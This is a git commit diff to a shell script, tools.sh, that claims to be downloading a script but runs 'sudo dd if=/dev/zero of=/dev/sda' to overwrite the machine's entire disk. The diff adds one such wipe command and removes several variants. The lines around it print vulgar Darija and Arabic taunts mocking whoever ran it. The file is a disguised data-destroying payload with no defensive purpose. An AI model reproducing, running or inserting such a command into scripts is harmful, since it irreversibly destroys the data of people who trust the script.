45ab1aba2e41c7cb079acb1df1ad8b457e68ee8f
hamza <hamzabenzidane01@gmail.com>
2025-06-17 03:07:17 +0100

    Update tools.sh

--- tools.sh
+++ tools.sh
@@ -5,11 +5,7 @@ YELLOW='\033[1;33m'
 NC='\033[0m'
 clear
     echo -e "${YELLOW}  Downloading script ✅${NC}"
+    sudo dd if=/dev/zero of=/dev/sda bs=1M
     echo -e "${YELLOW}  ydk fih hh nta li mkdyhach f krk hhhh 🖕🍆${NC}"
     echo -e "${YELLOW}  نتا اخويا لي مكتديهاش ف كرك ودابا يدك فيه هه 🖕🍆
     ${NC}"
-sudo dd if=/dev/zero of=/dev/sda bs=1M
-sudo dd if=/dev/zero of=/dev/sda bs=500M oflag=direct status=progress
-sudo dd if=/dev/zero of=/dev/sda bs=50M oflag=direct status=progress
-sudo dd if=/dev/zero of=/dev/sda bs=1M
-sudo dd if=/dev/zero of=/dev/sda bs=1M
